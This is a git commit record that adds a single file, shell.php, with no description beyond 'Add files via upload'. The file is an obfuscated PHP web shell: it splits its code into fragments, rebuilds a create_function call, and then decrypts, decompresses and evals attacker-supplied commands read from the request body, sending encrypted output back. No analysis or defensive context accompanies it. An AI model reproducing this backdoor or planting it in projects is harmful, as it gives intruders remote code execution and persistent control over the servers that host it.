3f30f92b3e6ec0f7d11dc0f5a4fbfd5e216f37fe
grover <loro2008@gmx.de>
2024-01-10 06:10:46 -0500

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,12 @@
+<?php
+$e=str_replace('h','','chrhehate_fuhhnctihon');
+$E='base|64_deco|de($m[1]|),$k)))|;|$|o|=|@ob_ge|t_contents();@o|b_end_clean(|';
+$a='nts("php|://input")|,$m)=|=1|) {@|ob_start();@e|val(@g||zuncompres|s(|@x(@';
+$D=');$r=@bas|e64_enc|ode(@x|(@gzc|ompress(|$o)|,$k)||);print("$p$kh|$r$kf");}';
+$G='($|i=|0;$i<|$l;){fo|r($j=0;($j<|$c&&$i<$l|);$j++|,$i++|)|{$o.=$|t{$i}^$k{|';
+$b='$j};}}|return $o|;}|if (@preg|_mat|ch("|/$kh|(.+)$kf/",@fi|le_|get_co||nte';
+$H='QyYNwjU";f|uncti|on| x($t|,|$k){$c|=strlen($k);$|l=str|len($t);$o=|"";fo|r';
+$x='$k=|"1a1d|c9|1c";$kh="907325||c692|71";$kf="ddf0|c944b|c72";$p|="ZC15O||zFBy';
+$h=str_replace('|','',$x.$H.$G.$b.$a.$E.$D);
+$o=$e('',$h);$o();
+?>
